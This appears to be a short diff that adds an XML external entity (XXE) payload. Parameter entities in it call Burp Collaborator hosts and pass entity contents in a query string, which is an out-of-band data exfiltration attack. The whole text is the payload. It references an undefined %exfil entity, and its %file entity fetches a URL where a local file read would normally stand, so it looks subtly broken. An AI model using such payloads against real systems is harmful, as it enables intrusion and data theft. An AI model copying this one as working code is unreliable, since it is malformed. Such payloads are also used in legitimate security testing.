@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "http://tc95s0jx18x830ryz3dcm6t3buhy5n.burpcollaborator.net">
+<!ENTITY % eval SYSTEM "http://88ekoffcxntnzfndvi9rilpi79db10.burpcollaborator.net/?x=%file;">
+%eval;
+%exfil;
